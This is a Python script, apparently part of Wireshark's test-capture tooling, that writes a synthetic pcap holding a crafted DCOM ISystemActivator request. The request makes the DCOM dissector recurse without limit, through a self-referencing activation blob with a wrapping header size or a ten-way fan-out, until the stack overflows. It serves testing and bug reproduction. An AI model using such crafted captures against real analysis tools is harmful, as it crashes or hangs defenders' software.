#!/usr/bin/env python3
# Helper module for the dcom_ifaces capture generator
#
# Wireshark - Network traffic analyzer
# By Gerald Combs <gerald@wireshark.org>
# Copyright 1998 Gerald Combs
#
# SPDX-License-Identifier: GPL-2.0-or-later
"""ISystemActivator: an activation property whose CLSID is the IID of
ActivationPropertiesIn makes dissect_dcom_ActivationPropertiesBody()
call dissect_dcom_ActivationProperties() again, with no depth limit.
A custom header size of 0xfffffff8 makes the body start where the blob
starts (old_offset + size wraps), so the same blob is dissected again
and again until the stack overflows.

Usage: sysact_actprops_recursion.py [mode]
  mode 'wrap' (default): one blob that loops back to itself
  mode 'fan':  ten properties of size 0, each again the blob (10^depth)
Synthetic: 192.0.2.50 -> 192.0.2.60, TCP port 135, DCE/RPC request only.
"""
import os
import sys

sys.path.insert(1, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'shared'))















import struct

HERE = os.path.dirname(os.path.abspath(__file__))
from rpcgen import TCP, RPC, NDR, pcap  # noqa: E402
import dcomlib as d

UUID_SYSACT = '000001a0-0000-0000-c000-000000000046'


def blob(n, nprops, hdrsize):
    """ACTIVATION_BLOB with nprops properties, all with CLSID =
    IID_ActivationPropertiesIn and size 0; custom header size hdrsize"""
    start = len(n.b)
    n.u32(0x100)                # totalSize
    n.u32(0)                    # reserved
    d.typesz_hdr(n)             # 16 octets
    n.u32(0x100)                # totalSize
    n.u32(hdrsize)              # headerSize
    n.u32(0)
    n.u32(2)                    # dstctx
    n.u32(nprops)
    n.guid(d.UUID_NULL)         # clsinfo
    n.ptr(True)
    n.ptr(True)
    n.ptr(False)
    n.u32(nprops)
    for _ in range(nprops):
        n.guid(d.IID_ACTPROPS_IN)
    n.u32(nprops)
    for _ in range(nprops):
        n.u32(0)
    return start


def main(mode='wrap'):
    frames = []
    t = TCP(frames, 50301, sport=135)
    r = RPC(t, UUID_SYSACT, (0, 0))
    r.bind(b'135\0')
    n = NDR()
    d.orpcthis(n)
    n.ptr(True)                 # pActProperties
    n.align(4)
    p1 = d.hole32(n)
    p2 = d.hole32(n)
    s = len(n.b)
    n.u32(0x574f454d)
    n.u32(4)                    # custom
    n.guid(d.IID_ACTPROPS_IN)
    n.guid(d.CLSID_ACTPROPS_IN)
    n.u32(0)
    n.u32(0x200)
    if mode == 'wrap':
        # header starts 8 octets after the blob; size -8 brings the
        # body back to the blob start
        blob(n, 1, 0xfffffff8)
    else:
        # 10 properties of size 0: each again starts at the body,
        # which is the next blob (header size 0 relative to the next)
        for _ in range(40):
            st = len(n.b)
            blob(n, 10, 0)
            # body = old_offset + headerSize: patch to point at next blob
            hs = len(n.b) - (st + 8)
            n.b[st + 8 + 16 + 4:st + 8 + 16 + 8] = struct.pack('<I', hs)
        n.raw(b'\0' * 64)
    d.patch32(n, p1, len(n.b) - s)
    d.patch32(n, p2, len(n.b) - s)
    r.request(3, n.bytes())     # RemoteGetClassObject
    t.fin()
    out = os.path.join(HERE, 'sysact_actprops_recursion%s.pcap' % ('' if mode == 'wrap' else '_fan'))
    pcap(out, frames)
    print(out)


if __name__ == '__main__':
    main(sys.argv[1] if len(sys.argv) > 1 else 'wrap')
